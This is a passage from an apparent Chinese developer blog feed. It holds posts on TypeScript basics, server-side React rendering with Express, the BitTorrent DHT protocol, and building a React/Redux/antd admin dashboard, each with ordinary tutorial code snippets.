name: string = 'muyy'let name2: String = 'muyy' Boolen 类型boolean是 true 或 false 的值，所以 let isBool3: boolean = new Boolean(1) 就会编译报错，因为 new Boolean(1) 生成的是一个 Bool 对象。1let isBool1: boolean = false Number 类型1let number: number = 10; Array 类型数组是 Array 类型。然而，因为数组是一个集合，我们还需要指定在数组中的元素的类型。我们通过 Array&lt;type&gt; or type[] 语法为数组内的元素指定类型12345let arr:number[] = [1, 2, 3, 4, 5];let arr2:Array&lt;number&gt; = [1, 2, 3, 4, 5];let arr3:string[] = ["1","2"];let arr4:Array&lt;string&gt; = ["1","2"]; Enums 类型列出所有可用值，一个枚举的默认初始值是0。你可以调整一开始的范围：123enum Role &#123;Employee = 3, Manager, Admin&#125;let role: Role = Role.Employeeconsole.log(role) // 3 Any 类型any 是默认的类型，其类型的变量允许任何类型的值：12let notSure:any = 10;let notSure2:any[] = [1,"2",false]; Void 类型JavaScript 没有空值 Void 的概念，在 TypeScirpt 中，可以用 void 表示没有任何返回值的函数：123function alertName(): void &#123; console.log('My name is muyy')&#125; 函数为函数定义类型我们可以给每个参数添加类型之后再为函数本身添加返回值类型。 TypeScript能够根据返回语句自动推断出返回值类型，因此我们通常省略它。下面函数 add, add2, add3 的效果是一样的，其中是 add3 函数是函数完整类型。1234567891011function add(x: string, y: string): string&#123; return "Hello TypeScript";&#125;let add2 = function(x: string, y: string): string&#123; return "Hello TypeScript";&#125;let add3: (x: string, y: string) =&gt; string = function(x: string, y: string): string&#123; return "Hello TypeScript";&#125; 可选参数和默认参数JavaScript 里，每个参数都是可选的，可传可不传。 没传参的时候，它的值就是 undefined 。 在 TypeScript 里我们可以在参数名旁使用?实现可选参数的功能。 比如，我们想让 lastname 是可选的：1234567function buildName(firstName: string, lastname?: string)&#123; console.log(lastname ? firstName + "" + lastname : firstName)&#125;let res1 = buildName("鸣","人"); // 鸣人let res2 = buildName("鸣"); // 鸣let res3 = buildName("鸣", "人", "君"); // Supplied parameters do not match any signature of call target. 如果带默认值的参数出现在必须参数前面，用户必须明确的传入 undefined 值来获得默认值。 例如，我们重写上例子，让 firstName 是带默认值的参数：123456function buildName2(firstName = "鸣", lastName?: string)&#123; console.log(firstName + "" + lastName)&#125;let res4 = buildName2("人"); // undefined人let res5 = buildName2(undefined, "人"); // 鸣人 类传统的JavaScript程序使用函数和基于原型的继承来创建可重用的组件，但对于熟悉使用面向对象方式的程序员来讲就有些棘手，因为他们用的是基于类的继承并且对象是由类构建出来的。 从ECMAScript 2015，也就是ECMAScript 6开始，JavaScript程序员将能够使用基于类的面向对象的方式。 使用TypeScript，我们允许开发者现在就使用这些特性，并且编译后的JavaScript可以在所有主流浏览器和平台上运行，而不需要等到下个JavaScript版本。 类1234567891011121314class Person&#123; name:string; // 这个是对后文this.name类型的定义 age:number; constructor(name:string,age:number)&#123; this.name = name; this.age = age; &#125; print()&#123; return this.name + this.age; &#125;&#125;let person:Person = new Person('muyy',23)console.log(person.print()) // muyy23 我们在引用任何一个类成员的时候都用了 this。 它表示我们访问的是类的成员。其实这本质上还是 ES6 的知识，只是在 ES6 的基础上多上了对 this 字段和引用参数的类型声明。 继承12345678910111213141516171819202122232425class Person&#123; public name:string; // public、private、static 是 typescript 中的类访问修饰符 age:number; constructor(name:string,age:number)&#123; this.name = name; this.age = age; &#125; tell()&#123; console.log(this.name + this.age); &#125;&#125;class Student extends Person&#123; gender:string; constructor(gender:string)&#123; super("muyy",23); this.gender = gender; &#125; tell()&#123; console.log(this.name + this.age + this.gender); &#125;&#125;var student = new Student("male");student.tell(); // muyy23male 这个例子展示了 TypeScript 中继承的一些特征，可以看到其实也是 ES6 的知识上加上类型声明。不过这里多了一个知识点 —— 公共，私有，以及受保护的修饰符。TypeScript 里，成员默认为 public ；当成员被标记成 private 时，它就不能在声明它的类的外部访问；protected 修饰符与private 修饰符的行为很相似，但有一点不同，protected 成员在派生类中仍然可以访问。 存储器TypeScript 支持通过 getters/setters 来截取对对象成员的访问。 它能帮助你有效的控制对对象成员的访问。 对于存取器有下面几点需要注意的：首先，存取器要求你将编译器设置为输出 ECMAScript 5 或更高。 不支持降级到 ECMAScript 3。 其次，只带有 get 不带有 set 的存取器自动被推断为 readonly。 这在从代码生成 .d.ts 文件时是有帮助的，因为利用这个属性的用户会看到不允许够改变它的值。12345678910111213141516171819202122232425class Hello&#123; private _name: string; private _age: number; get name(): string &#123; return this._name; &#125; set name(value: string) &#123; this._name = value; &#125; get age(): number&#123; return this._age; &#125; set age(age: number) &#123; if(age&gt;0 &amp;&amp; age&lt;100)&#123; console.log("年龄在0-100之间"); // 年龄在0-100之间 return; &#125; this._age = age; &#125;&#125;let hello = new Hello();hello.name = "muyy";hello.age = 23console.log(hello.name); // muyy 接口接口TypeScript的核心原则之一是对值所具有的结构进行类型检查。在TypeScript里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。123456789101112interface LabelValue&#123; label: string;&#125;function printLabel(labelObj: LabelValue)&#123; console.log(labelObj.label);&#125;let myObj = &#123; "label":"hello Interface"&#125;;printLabel(myObj); LabelledValue 接口就好比一个名字，它代表了有一个 label 属性且类型为 string 的对象。只要传入的对象满足上述必要条件，那么它就是被允许的。 另外，类型检查器不会去检查属性的顺序，只要相应的属性存在并且类型也是对的就可以。 可选属性带有可选属性的接口与普通的接口定义差不多，只是在可选属性名字定义的后面加一个 ? 符号。可选属性的好处之一是可以对可能存在的属性进行预定义，好处之二是可以捕获引用了不存在的属性时的错误。123456789101112131415161718192021interface Person&#123; name?:string; age?:number;&#125;function printInfo(info:Person)&#123; console.log(info);&#125;let info = &#123; "name":"muyy", "age":23&#125;;printInfo(info); // &#123;"name": "muyy", "age": 23&#125;let info2 = &#123; "name":"muyy"&#125;;printInfo(info2); // &#123;"name": "muyy"&#125; 函数类型接口能够描述 JavaScript 中对象拥有的各种各样的外形。 除了描述带有属性的普通对象外，接口也可以描述函数类型。定义的函数类型接口就像是一个只有参数列表和返回值类型的函数定义。参数列表里的每个参数都需要名字和类型。定义后完成后，我们可以像使用其它接口一样使用这个函数类型的接口。 1234567891011interface SearchFunc&#123; (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source: string,subString: string)&#123; return source.search(subString) !== -1;&#125;;console.log(mySearch("鸣人","鸣")); // trueconsole.log(mySearch("鸣人","缨")); // false 可索引类型与使用接口描述函数类型差不多，我们也可以描述那些能够“通过索引得到”的类型，比如 a[10] 或 ageMap[&quot;daniel&quot;]。 可索引类型具有一个索引签名，它描述了对象索引的类型，还有相应的索引返回值类型。 让我们看如下例子：1234567interface StringArray&#123; [index: number]: string;&#125;let MyArray: StringArray;MyArray = ["是","云","随","风"];console.log(MyArray[2]); // 随 类类型与 C# 或 Java 里接口的基本作用一样，TypeScript 也能够用它来明确的强制一个类去符合某种契约。 我们可以在接口中描述一个方法，在类里实现它，如同下面的 setTime 方法一样：123456789101112interface ClockInterface&#123; currentTime: Date; setTime(d: Date);&#125;class Clock implements ClockInterface&#123; currentTime: Date; setTime(d: Date)&#123; this.currentTime = d; &#125; constructor(h: number, m: number) &#123;&#125;&#125; 继承接口和类一样，接口也可以相互继承。 这让我们能够从一个接口里复制成员到另一个接口里，可以更灵活地将接口分割到可重用的模块里。12345678910111213141516interface Shape&#123; color: string;&#125;interface PenStroke&#123; penWidth: number;&#125;interface Square extends Shape,PenStroke&#123; sideLength: number;&#125;let s = &lt;Square&gt;&#123;&#125;;s.color = "blue";s.penWidth = 100;s.sideLength = 10; 模块TypeScript 与 ECMAScript 2015 一样，任何包含顶级 import 或者 export 的文件都被当成一个模块。123456789101112131415161718export interface StringValidator&#123; isAcceptable(s:string): boolean;&#125;var strReg = /^[A-Za-z]+$/;var numReg = /^[0-9]+$/;export class letterValidator implements StringValidator&#123; isAcceptable(s:string): boolean&#123; return strReg.test(s); &#125;&#125;export class zipCode implements StringValidator&#123; isAcceptable(s: string): boolean&#123; return s.length == 5 &amp;&amp; numReg.test(s); &#125;&#125; 泛型软件工程中，我们不仅要创建一致的定义良好的 API ，同时也要考虑可重用性。 组件不仅能够支持当前的数据类型，同时也能支持未来的数据类型，这在创建大型系统时为你提供了十分灵活的功能。在像 C# 和 Java 这样的语言中，可以使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据。 这样用户就可以以自己的数据类型来使用组件。 初探泛型如下代码，我们给 Hello 函数添加了类型变量 T ，T 帮助我们捕获用户传入的类型（比如：string）。我们把这个版本的 Hello 函数叫做泛型，因为它可以适用于多个类型。 代码中 output 和 output2 是效果是相同的，第二种方法更加普遍，利用了类型推论 —— 即编译器会根据传入的参数自动地帮助我们确定T的类型：123456789function Hello&lt;T&gt;(arg:T):T&#123; return arg;&#125;let outPut = Hello&lt;string&gt;('Hello Generic');let output2 = Hello('Hello Generic')console.log(outPut);console.log(outPut2); 参考资料 TypeScript 中文文档 TypeScript TypeScript for Angular 2 - Part 1 (An Introduction)]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React 在服务端渲染的实现]]></title>
    <url>%2Fblog%2F2017%2F07%2F01%2FServer-Side-React-Rendering%2F</url>
    <content type="text"><![CDATA[原文地址：Server-Side React Rendering React是最受欢迎的客户端 JavaScript 框架，但你知道吗(可以试试)，你可以使用 React 在服务器端进行渲染？ React 在服务端渲染的实现假设你已经在客户端使用 React 构建了一个事件列表 app。该应用程序使用了您最喜欢的服务器端工具构建的API。几周后，用户告诉您，他们的页面没有显示在 Google 上，发布到 Facebook 时也显示不出来。 这些问题似乎是可以解决的，对吧？ 您会发现，要解决这个问题，需要在初始加载时从服务器渲染 React 页面，以便来自搜索引擎和社交媒体网站的爬虫工具可以读取您的标记。有证据表明，Google 有时会执行 javascript 程序并且对生成的内容进行索引，但并不总是的。因此，如果您希望确保与其他服​​务（如Facebook，Twitter）有良好的SEO兼容性，那么始终建议使用服务器端渲染。 在本教程中，我们将逐步介绍服务器端的呈现示例。包括围绕与API交流的React应用程序的共同路障。在本教程中，我们将逐步向您介绍服务器端的渲染示例。包括围绕着 APIS 交流一些在服务端渲染 React 应用程序的共同障碍。 服务端渲染的优势可能您的团队谈论到服务端渲染的好处是首先会想到 SEO，但这并不是唯一的潜在好处。 更大的好处如下：服务器端渲染能更快地显示页面。使用服务器端渲染，您的服务器对浏览器进行响应是在您的 HTML 页面可以渲染的时候，因此浏览器可以不用等待所有的 JavaScript 被下载和执行就可以开始渲染。当浏览器下载并执行页面所需的 JavaScript 和其他资源时，不会出现 “白屏” 现象，而 “白屏” 这是在完全有客户端呈现的 React 网站中可能发生的情况。 入门接下来让我们来看看如何将服务器端渲染添加到一个基本的客户端渲染的使用Babel和Webpack的React应用程序中。我们的应用程序将增加从第三方 API 获取数据的复杂性。我们在GitHub上提供了相关代码，您可以在其中看到完整的示例。 提供的代码中只有一个 React 组件，`hello.js`，这个文件将向 ButterCMS 发出异步请求，并渲染返回的 JSON 列表的博文。ButterCMS 是一个基于API的博客引擎，可供个人使用，因此它非常适合测试现实生活中的用例。启动代码中连接着一个 API token，如果你想使用你自己的 API token 可以使用你的 GitHub 账号登入 ButterCMS。 1234567891011121314151617181920212223242526272829303132333435import React from 'react';import Butter from 'buttercms'const butter = Butter('b60a008584313ed21803780bc9208557b3b49fbb');var Hello = React.createClass(&#123; getInitialState: function() &#123; return &#123;loaded: false&#125;; &#125;, componentWillMount: function() &#123; butter.post.list().then((resp) =&gt; &#123; this.setState(&#123; loaded: true, resp: resp.data &#125;) &#125;); &#125;, render: function() &#123; if (this.state.loaded) &#123; return ( &lt;div&gt; &#123;this.state.resp.data.map((post) =&gt; &#123; return ( &lt;div key=&#123;post.slug&#125;&gt;&#123;post.title&#125;&lt;/div&gt; ) &#125;)&#125; &lt;/div&gt; ); &#125; else &#123; return &lt;div&gt;Loading...&lt;/div&gt;; &#125; &#125;&#125;);export default Hello; 启动器代码中包含以下内容： package.json - 依赖项 Webpack 和 Babel 配置 index.html - app 的 HTML 文件 index.js - 加载 React 并渲染 Hello 组件 要使应用运行，请先克隆资源库： 12git clone ...cd .. 安装依赖: 1npm install 然后启动服务器: 1npm run start 浏览器输入 http://localhost:8000 可以看到这个 app: (这里译者进行补充，package.json 里的 start 命令改为如下：&quot;start&quot;: webpack-dev-server --watch) 如果您查看渲染页面的源代码，您将看到发送到浏览器的标记只是一个到 JavaScript 文件的链接。这意味着页面的内容不能保证被搜索引擎和社交媒体平台抓取: 增加服务器端渲染接下来，我们将实现服务器端渲染，以便将完全生成的HTML发送到浏览器。如果要同时查看所有更改，请查看GitHub上的差异。 开始前，让我们安装 Express，一个 Node.js 的服务器端应用程序框架： 1npm install express --save 我们要创建一个渲染我们的 React 组件的服务器： 123456789101112131415161718192021222324252627282930313233import express from 'express';import fs from 'fs';import path from 'path';import React from 'react';import ReactDOMServer from 'react-dom/server';import Hello from './Hello.js';function handleRender(req, res) &#123; // 把 Hello 组件渲染成 HTML 字符串 const html = ReactDOMServer.renderToString(&lt;Hello /&gt;); // 加载 index.html 的内容 fs.readFile('./index.html', 'utf8', function (err, data) &#123; if (err) throw err; // 把渲染后的 React HTML 插入到 div 中 const document = data.replace(/&lt;div id="app"&gt;&lt;\/div&gt;/, `&lt;div id="app"&gt;$&#123;html&#125;&lt;/div&gt;`); // 把响应传回给客户端 res.send(document); &#125;);&#125;const app = express();// 服务器使用 static 中间件构建 build 路径app.use('/build', express.static(path.join(__dirname, 'build')));// 使用我们的 handleRender 中间件处理服务端请求app.get('*', handleRender);// 启动服务器app.listen(3000); 让我们分解下程序看看发生了什么事情… handleRender 函数处理所有请求。在文件顶部导入的 ReactDOMServer 类提供了将 React 节点渲染成其初始 HTML 的 renderToString() 方法1ReactDOMServer.renderToString(&lt;Hello /&gt;); 这将返回 Hello 组件的 HTML ，我们将其注入到 index.html 的 HTML 中，从而生成服务器上页面的完整 HTML 。 1const document = data.replace(/&lt;div id="app"&gt;&lt;\/div&gt;/,`&lt;div id="app"&gt;$&#123;html&#125;&lt;/div&gt;`); 要启动服务器，请更新 `package.json` 中的起始脚本，然后运行 npm run start : 123&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;webpack &amp;&amp; babel-node server.js&quot;&#125;, 浏览 http://localhost:3000 查看应用程序。瞧！您的页面现在正在从服务器渲染出来了。但是有个问题，如果您在浏览器中查看页面源码，您会注意到博客文章仍未包含在回复中。这是怎么回事？如果我们在Chrome中打开网络标签，我们会看到客户端上发生API请求。 虽然我们在服务器上渲染了 React 组件，但是 API 请求在 componentWillMount 中异步生成，并且组件在请求完成之前渲染。所以即使我们已经在服务器上完成渲染，但我们只是完成了部分。事实上，React repo 有一个 issue，超过 100 条评论讨论了这个问题和各种解决方法。 在渲染之前获取数据要解决这个问题，我们需要在渲染 Hello 组件之前确保 API 请求完成。这意味着要使 API 请求跳出 React 的组件渲染循环，并在渲染组件之前获取数据。我们将逐步介绍这一步，但您可以在GitHub上查看完整的差异。 要在渲染之前获取数据，我们需安装 react-transmit： 1npm install react-transmit --save React Transmit 给了我们优雅的包装器组件（通常称为“高阶组件”），用于获取在客户端和服务器上工作的数据。 这是我们使用 react-transmit 后的组件的代码： 12345678910111213141516171819202122232425262728293031323334import React from 'react';import Butter from 'buttercms'import Transmit from 'react-transmit';const butter = Butter('b60a008584313ed21803780bc9208557b3b49fbb');var Hello = React.createClass(&#123; render: function() &#123; if (this.props.posts) &#123; return ( &lt;div&gt; &#123;this.props.posts.data.map((post) =&gt; &#123; return ( &lt;div key=&#123;post.slug&#125;&gt;&#123;post.title&#125;&lt;/div&gt; ) &#125;)&#125; &lt;/div&gt; ); &#125; else &#123; return &lt;div&gt;Loading...&lt;/div&gt;; &#125; &#125;&#125;);export default Transmit.createContainer(Hello, &#123; // 必须设定 initiallVariables 和 ftagments ,否则渲染时会报错 initialVariables: &#123;&#125;, // 定义的方法名将成为 Transmit props 的名称 fragments: &#123; posts() &#123; return butter.post.list().then((resp) =&gt; resp.data); &#125; &#125;&#125;); 我们已经使用 Transmit.createContainer 将我们的组件包装在一个高级组件中，该组件可以用来获取数据。我们在 React 组件中删除了生命周期方法，因为无需两次获取数据。同时我们把 render 方法中的 state 替换成 props，因为 React Transmit 将数据作为 props 传递给组件。 为了确保服务器在渲染之前获取数据，我们导入 Transmit 并使用 Transmit.renderToString 而不是 ReactDOM.renderToString 方法 12345678910111213141516171819202122232425262728293031import express from 'express';import fs from 'fs';import path from 'path';import React from 'react';import ReactDOMServer from 'react-dom/server';import Hello from './Hello.js';import Transmit from 'react-transmit';function handleRender(req, res) &#123; Transmit.renderToString(Hello).then((&#123;reactString, reactData&#125;) =&gt; &#123; fs.readFile('./index.html', 'utf8', function (err, data) &#123; if (err) throw err; const document = data.replace(/&lt;div id="app"&gt;&lt;\/div&gt;/, `&lt;div id="app"&gt;$&#123;reactString&#125;&lt;/div&gt;`); const output = Transmit.injectIntoMarkup(document, reactData, ['/build/client.js']); res.send(document); &#125;); &#125;);&#125;const app = express();// 服务器使用 static 中间件构建 build 路径app.use('/build', express.static(path.join(__dirname, 'build')));// 使用我们的 handleRender 中间件处理服务端请求app.get('*', handleRender);// 启动服务器app.listen(3000); 重新启动服务器浏览到 http://localhost：3000。查看页面源代码，您将看到该页面现在完全呈现在服务器上！ 更进一步我们做到了！在服务器上使用 React 可能很棘手，尤其是从 API 获取数据时。幸运的是，React社区正在蓬勃发展，并创造了许多有用的工具。如果您对构建在客户端和服务器上渲染的大型 React 应用程序的框架感兴趣，请查看 Walmart Labs 的 Electrode 或 Next.js。或者如果要在 Ruby 中渲染 React ，请查看 AirBnB 的 Hypernova 。]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>SEO</tag>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BitTorrent DHT 协议简述]]></title>
    <url>%2Fblog%2F2017%2F06%2F16%2F2017-06-16-bittorrent-dht-protocal%2F</url>
    <content type="text"><![CDATA[BitTorrent DHT 协议原理还是比较好理解的，内容不多，本文把基本的介绍、规则和路由表维护规则做了简述，方便理解。官方文档：http://www.bittorrent.org/beps/bep_0005.html Brif（简介）DHT, distributed sloppy hash tabl. BT 协议像 TCP/IP 协议一样是一个协议簇 DHT 协议是在 UDP 通信协议的基础上使用 Kademila（俗称 Kad 算法）算法实现 Tracker 服务器保存和 torrent 文件相关的 peer 的信息 一个 peer 节点是一个实现了 BT 协议并且开启了 TCP 监听端口的 BT 客户端或者服务器 一个 node 节点是一个实现了 DHT 协议并且开启了 UDP 监听端口的 BT 客户端或者服务器 DHT 由很多 node 节点以及这些 node 节点保存的 peer 地址信息组成 一个 BT 客户端包括了一个 DHT node 节点，通过这些节点来和 DHT 网络中的其它节点通信来获取 peer 节点的信息，然后再通过 BT 协议从 peer 节点下载文件 DHT 协议通过从附近的 node 节点获取 peer 信息，而不是从 tracker 服务器获取 peer 信息，这就是所谓的 trackerless. Principle（规则） Node 节点必须保存一份 Routing Table（路由表） 和 DHT 网络中一小部分节点交流的信息 Node 在发起种子下载请求时，会根据 IP 生成 token 标识自己在下载 当某个 Node 节点想找某个种子的 peer 信息时，通过 Kad 获取最近 Node 节点信息，带上 token 后进行通讯 下一个最近 Node 节点中有 peer 信息则直接验证 token 返回，否则继续传播这个信息 token 有效时间是 10 分钟 Routing Table（路由表） 每一个节点都维护一个路由表保存一些已知的通信好的节点 一个活跃的节点就是能在 15 分钟之内响应过请求或者在 15 分钟之内发送过请求的节点 路由表可以被划分为 buckets（桶），每一个 bucket 包含一个子部分的 nodeID 空间 buckets 可以装 node 节点信息 通讯不好的节点会从 buckets 中被剔除 刚初始化的节点中路由表为空 一般会通过解析一个 .torrent 文件来获取 peer 信息，从而构建路由表 还有 KPRC 协议，比较细节，就没有详述了。]]></content>
      <categories>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>DHT</tag>
        <tag>BitTorrent</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 React 全家桶搭建一个后台管理系统]]></title>
    <url>%2Fblog%2F2017%2F06%2F15%2F%E4%BD%BF%E7%94%A8React%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%90%AD%E5%BB%BA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[使用React技术栈搭建一个后台管理系统最初是为了上手公司的业务，后来发现这个项目还能把平时遇到的有趣的demo给整合进去。此文尝试对相关的技术栈以及如何在该项目中引人Redux进行分析。 项目地址以及局部展示 项目地址 小模块展示： redux在项目中的运用demo展示 项目目录结构1234567891011121314151617181920212223242526272829303132├── build.js 项目打包后的文件├── config webpack配置文件│ ├──...│ ├──webpack.config.dev.js 开发环境配置│ ├──webpack.config.prod.js 生产环境配置├── node_modules node模块目录├── public│ └──index.html├── scripts│ ├── build.js 打包项目文件│ ├── start.js 启动项目文件│ └── test.js 测试项目文件├── src│ ├── client 汇聚(入口)目录│ ├── common 核心目录│ │ ├── actions redux中的action│ │ ├── components 通用功能组件│ │ ├── container 通用样式组件│ │ ├── images│ │ ├── pages 页面模块│ │ ├── reducers redux中的reducer│ │ ├── utils 工具类│ │ │ ├── config.js 通用配置│ │ │ ├── menu.js 菜单配置│ │ │ └── ajax.js ajax模块(日后用到)│ │ └── routes.js 前端路由│ └── server 服务端目录(日后用到)│ └── controller├── .gitignore├── package.json├── README.md└── yarn.lock 项目的初始结构和构造原因已罗列如上，由于过些日子会引人ts，所以项目结构必然还会改动，但肯定基于这基本雏形扩展的。 下面对目录结构作以下说明 项目最初始是用 create-react-app 初始化的，create-react-app 是Facebook官方提供的 React 脚手架，也是业界最优秀的 React 应用开发工具之一; client 作为入口目录，到时候可以把第三方中间件也放在此处; container 和 components 存放的都是 react 组件,区别如下表。但是我把和样式有关的组件就放在container中，把和功能有关的模块(比如自己分装的表格组件、弹出输入框组件等)就放到components中，若日后有需要，container 和 component 组件都是可以在 Redux 数据流中的。 container component 目的 如何工作(数据获取,状态更新) 如何显示(样式，布局) 是否在 Redux 数据流中 是 否 读取数据 从 Redux 获取 state 从 props 获取数据 修改数据 向 Redux 派发 actions 从 props 调用回调函数 实现方式 向react-redux生成 手写 ajax 模块到时候计划用 fetch 封装一个ajax，感觉使用 fetch 还是蛮便利的。 server 层就是作为网关层，日后计划用来写 node 的。 技术栈相关虽然用到的技术栈众多，但是自己也谈不上熟练运用，多半是边查API边用的，所以只罗列些自己用相关的技术栈解决的点; webpack(2.x)4月的时候 create-react-app 还是基于 webpack(1.x) 构建的，5月27号升到了webpack(2.6),于是我也进行了 webpack 的版本升级。 按需加载babel-plugin-import 是一个用于按需加载组件代码和样式的 babel 插件，使用此插件后，在引人 antd 相应模块就能实现按需引人，在config/webpack.config.dev.js 文件中作如下修改:123456789101112&#123; test: /\.(js|jsx)$/, include: paths.appSrc, loader: require.resolve('babel-loader'), options: &#123; plugins: [ "transform-decorators-legacy", // 引人 ES7 的装饰器 @ ['import', [&#123; libraryName: 'antd', style: true &#125;]], ], cacheDirectory: true, &#125;, &#125;, 引人less首先引人 less-loader 来加载 less 样式，同时修改 config/webpack.config.dev.js 文件12345678910111213141516171819202122232425262728293031 test: /\.less$/, use: [ require.resolve('style-loader'), require.resolve('css-loader'), &#123; loader: require.resolve('postcss-loader'), options: &#123; ident: 'postcss', //https://webpack.js.org/guides/migrating/#complex-options plugins: () =&gt; [ require('postcss-flexbugs-fixes'), autoprefixer(&#123; browsers: [ '&gt;1%', 'last 4 versions', 'Firefox ESR', 'not ie &lt; 9', // React doesn't support IE8 anyway ], flexbox: 'no-2009', &#125;), ], &#125;, &#125;, &#123; loader: require.resolve('less-loader'), options: &#123; modifyVars: &#123; "@primary-color": "#1DA57A" &#125;, // 这里利用了 less-loader 的 modifyVars 来进行主题配置， 变量和其他配置方式可以参考 [配置主题](https://ant.design/docs/react/customize-theme-cn) 文档。 &#125;, &#125;, ],&#125;, 一键发布到 gh-pages用到了 gh-pages ,使用 npm run deploy 一键发布到自己的gh-pages上，姑且把gh-pages当成生产环境吧，所以在修改config/webpack.config.dev.js 文件的同时也要对 config/webpack.config.prod.js 作出一模一样的修改。 引用路径的缩写1234567891011alias: &#123; 'react-native': 'react-native-web', components: path.resolve(__dirname, '..') + '/src/common/components', container: path.resolve(__dirname, '..') + '/src/common/container', images: path.resolve(__dirname, '..') + '/src/common/images', pages: path.resolve(__dirname, '..') + '/src/common/pages', utils: path.resolve(__dirname, '..') + '/src/common/utils', data: path.resolve(__dirname, '..') + '/src/server/data', actions: path.resolve(__dirname, '..') + '/src/common/actions', reducers: path.resolve(__dirname, '..') + '/src/common/reducers', &#125;, 配置了引用路径的缩写后，就可以在任意地方如这样引用，比如1import Table from 'components/table' Antd(2.x)antd是（蚂蚁金服体验技术部）经过大量的项目实践和总结，沉淀出的一个中台设计语言 Ant Design，使用者包括蚂蚁金服、阿里巴巴、口碑、美团、滴滴等一系列知名公司，而且我从他们的设计理念也学到了很多关于UI、UX的知识。该项目采用的是antd最新的版本2.10.0,由于2.x的版本和1.x的版本还是相差蛮大的，之前参考的项目(基于1.x)改起来太费劲，所以在组件那块就干脆自己重新封装了一遍。这部分知识点建议多看文档，官方更新还是非常勤快的。 React-router(4.x)react-router 4.x和2.x的差异又是特别的大，召唤文档,网上基本上都还是2.x的教程，看过文档之后，反正简而言之其就是要让使用者更容易上手。印象最深的是以前嵌套路由写法在4.x中写到同层了。如下示例他们的效果是相同的。 2.x:1234&lt;Route path="/" component=&#123;App&#125;&gt; &lt;Route path="/aaaa" component=&#123;AAAA&#125; /&gt; &lt;Route path="/bbbb" component=&#123;BBBB&#125; /&gt;&lt;/Route&gt; 4.x:123&lt;Route path="/" component=&#123;App&#125; /&gt;&lt;Route path="/aaaa" component=&#123;AAAA&#125; /&gt;&lt;Route path="/bbbb" component=&#123;BBBB&#125; /&gt; Fetchfetch 使用比较简单，基本的 promise 用法如下123fetch(url).then(response =&gt; response.json()) .then(data =&gt; console.log(data)) .catch(e =&gt; console.log("Oops, error", e)) 此外还能这样用1234567try &#123; let response = await fetch(url); let data = await response.json(); console.log(data);&#125; catch(e) &#123; console.log("Oops, error", e);&#125; 但是其简洁的特点是为了让我们可以自定义其扩展，还是其本身就还不完善呢？我在调用 JSONP 的请求时，发现其不支持对 JSONP 的调用，所幸社区还是很给力地找到了 fetch-jsonp 这个模块，实现了对百度音乐接口调用。fetch-jsonp使用也和 fetch 类似，代码如下123fetchJsonp(url,&#123;method: 'GET'&#125;) .then((res) =&gt;res.json()) .then((data) =&gt; &#123;&#125;) Redux使用了redux也已经有段时日了，我对redux的定义就是更好的管理组件的状态，一旦应用的逻辑复杂起来，各种组件状态、界面耦合起来，就容易出岔子，redux就是为了解决这个而诞生的，让我们可以更多地关注UI层，而降低对状态的关注。 画了一幅比较简陋的图来说明 redux 的大致流程，假设首先通过鼠标点击页面上的按钮触发了一个行为(action)，这时我们叫了一辆出租车 dispatch() 将这个 action 带到了终点站 store。这时候 store 就会通过 reducer 函数返回一个新的状态 state，从而改变 UI 显示。之前也写了篇深入Redux架构 下面通过把 代办事项 这个demo运用到后台管理系统中来讲解 Redux 在其中的运用。 首先，在入口目录创建 store12345678const store = createStore(rootReducer)ReactDOM.render( &lt;Provider store=&#123;store&#125;&gt; &#123; routes &#125; &lt;/Provider&gt;, document.getElementById('root')); 接着，我使用了 redux-actions 这个模块。使用 redux-actions 的好处是能简化大量对 action 的声明，以及能简化 reducer 的写法。 代办事项的 actions 文件片段(拿展示全部任务、已完成任务、未完成任务的 action 举例):123import &#123; createAction &#125; from 'redux-actions'export const setVisibility = createAction('SET_VISIBILITY') 没使用 redux-actions 时，actions 写法如下，可看出着实麻烦了不少，123456export const setVisibility = (filter) =&gt; &#123; return &#123; type: "SET_VISIBILITY", filter &#125;&#125; 相应的代办事项的 reducers 文件片段:12345export const setVisibility = handleActions(&#123; 'SET_VISIBILITY'(state, action) &#123; return &#123; ...state, ...action.payload&#125; &#125;&#125;, 'SHOW_ALL') 使用 redux-actions 后，只要进行如下调用,reducers文件里的SET_VISIBILITY的 action 就能捕获到SHOW_ALL这个状态。12345678import &#123; setVisibility &#125; from 'actions/todoList'@connect( (state) =&gt; (&#123; setVisibility: state.setVisibility, // 这个 setVisibility 是取自 reducers 的 &#125;))dispatch(this.props.dispatch(setVisibility('SHOW_ALL'))) connect 来自 react-redux，这里的 @ 是 ES7里的装饰器的用法，使用它之后又能减少不少的代码量，原来还要写 mapStateToProps、mapDispatchToProps。 项目的一些扩展计划计划在该项目把平时工作、学习中遇到的react案例抽离成demo展现出来，所以以后还会多出一些模块。另外过段时间会在该项目中引人 typescript，如果还有精力的话，可以在这个项目上折腾下网关层。喜欢这个项目的话，点我 Star。]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
        <tag>Redux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读书笔记-你不知道的 JavaScript (上)]]></title>
    <url>%2Fblog%2F2017%2F06%2F06%2FThe-Note-of-You-Dont-Know-JS-1%2F</url>
